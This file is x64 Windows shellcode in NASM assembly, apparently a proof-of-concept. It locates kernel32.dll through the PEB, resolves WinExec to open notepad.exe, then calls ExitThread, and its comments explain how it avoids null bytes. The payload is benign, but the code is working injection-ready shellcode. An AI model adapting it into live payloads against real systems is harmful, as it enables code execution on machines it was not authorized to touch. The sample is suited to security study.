BITS 64

section .text
global _start

_start:

    ; FIND AND CALL WINEXEC

    sub rsp, 0x28                    ; create shadow space on stack
    and rsp, 0FFFFFFFFFFFFFFF0h   

    xor rax, rax                     ; clear registers
    xor rbx, rbx
    xor rcx, rcx
    mov rax, [gs:60h + rbx]          ; get kernel32.dll address
    mov rax, [rax+18h]            
    mov rax, [rax+20h]            
    mov rax, [rax+rcx]
    mov rax, [rax+rcx]
    mov rbx, [rax+20h]               ; move kernel32.dll address to rbx
    mov r8, rbx                      ; move kernel32.dll to r8
    mov ebx, [rbx+3ch]
    add rbx, r8                      ; move PE address into rbx
    mov rcx, 0x88FFFFFFFFFFFFFF
    shr rcx, 78h
    mov edx, [rbx + rcx]	
    add rdx, r8                      ; move export table addr into rdx
    mov r10d, [rdx + 14h]            ; move number of functions to r10
    xor r11, r11   
    mov r11d, [rdx + 20h]            ; move address of function names to r11
    add r11, r8
    xor rcx, rcx

    mov rcx, r10                     ; move number of functions to rcx for counter
    functionfinder:                  ; sort through address of function names until we find WinExec
        jecxz functionfound
        xor ebx, ebx
        mov ebx, [r11+4+rcx*4]
        add rbx, r8
        dec rcx
        mov rax, 636578456E6957FFh   ; move "WinExec"FF into rax
        shr rax, 8h                  ; shorten string to remove FF, avoiding null bytes
        cmp [rbx], rax               ; compare current function in loop with rax
        jnz functionfinder           ; loop if current function is not "WinExec"
    
    functionfound:                   ; when current function address is equal to "WinExec" get function from address
        xor r11, r11
        mov r11d, [rdx+0x24]
        add r11, r8
        inc rcx
        mov r13w, [r11+rcx*2]
        xor r11, r11
        mov r11d, [rdx+0x1c]
        add r11, r8
        mov eax, [r11+4+r13*4]
        add rax, r8
        mov r14, rax                 ; move WinExec function into r14 
        
    xor rax, rax      
    mov rax, 657865FFFFFFFFFFh       ; move "exe"FF into rax
    shr rax, 68h                     ; shorten string to remove FF, avoiding null bytes
    push rax                         ; push onto stack
    mov rax, 2E64617065746F6Eh       ; move "notepad." into rax
    push rax                         ; push onto stack
    mov rcx, rsp                     ; move current stack, "notepad.exe", to rcx for parameter use

    xor rdx,rdx
    inc rdx                          ; set rdx to 1 for "SW_SHOWNORMAL" parameter
    sub rsp, 0x30                    ; make stack space for call
    call r14                         ; call WinExec
    add rsp, 0x30                    ; clean up stack
    add rsp, 0x10 

    ; EXIT THREAD CLEANLY
    ; next part is unecessary redundancy - finding kernel32 address, same as the first time - refer to comments above for explanation

    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx
    mov rax, [gs:60h + rbx]
    mov rax, [rax+18h]
    mov rax, [rax+20h]
    mov rax, [rax+rcx]
    mov rax, [rax+rcx]
    mov rbx, [rax+20h]
    mov r8, rbx
    mov ebx, [rbx+3ch]
    add rbx, r8
    mov rcx, 0x88FFFFFFFFFFFFFF
    shr rcx, 78h
    mov edx, [rbx + rcx]	
    add rdx, r8
    mov r10d, [rdx + 14h]
    xor r11, r11
    mov r11d, [rdx + 20h]
    add r11, r8
    xor rcx, rcx

    mov rcx, r10                     
    mov rax, 737365726464FFFFh       ; move "ddress"FFFF into rax
    shr rax, 10h                     ; shorten string to remove FF, avoiding null bytes
    push rax                         ; push onto stack
    mov rax, 41636F7250746547h       ; move "GetProcA" into rax
    push rax                         ; push onto stack
    mov rax, [rsp]                   ; move "GetProcAddress" pointer from stack to rax
    findgetproc:                     ; loop until address of GetProcAddress is found
        jecxz foundgetproc
        xor ebx, ebx
        mov ebx, [r11+4+rcx*4]
        add rbx, r8
        dec rcx
        cmp [rbx], rax
        jnz findgetproc

    foundgetproc:                    ; when GetProcAddress is found
        xor r11, r11
        mov r11d, [rdx+0x24]
        add r11, r8
        inc rcx
        mov r13w, [r11+rcx*2]
        xor r11, r11
        mov r11d, [rdx+0x1c]
        add r11, r8
        mov eax, [r11+4+r13*4]
        add rax, r8
        mov r14, rax                 ; move GetProcAddress function to r14

    xor rcx, rcx
    xor rdx, rdx
    mov rax, 6461FFFFFFFFFFFFh       ; move "ad"FFFFFFFFFFFF into rax
    shr rax, 70h                     ; shorten string to remove FF, avoiding null bytes
    push rax                         ; push onto stack
    mov rax, 6572685474697845h       ; move "ExitThre" into rax
    push rax                         ; push onto stack
    mov rdx, rsp                     ; move "ExitThread" from stack to rdx for parameter
    mov rcx, r8                      ; move kernel32.dll base address to rcx for parameter
    sub rsp, 30h        
    call r14                         ; call GetProcAddress(kernel32.dll, ExitThread)
    add rsp, 30h
    add rsp, 10h
    mov r15, rax                     ; move ExitThread function (returned to rax by GetProcAddress) to r15
    xor rcx, rcx                     ; clear rcx for parameter
    sub rsp, 30h
    call r15                         ; call ExitThread(0)
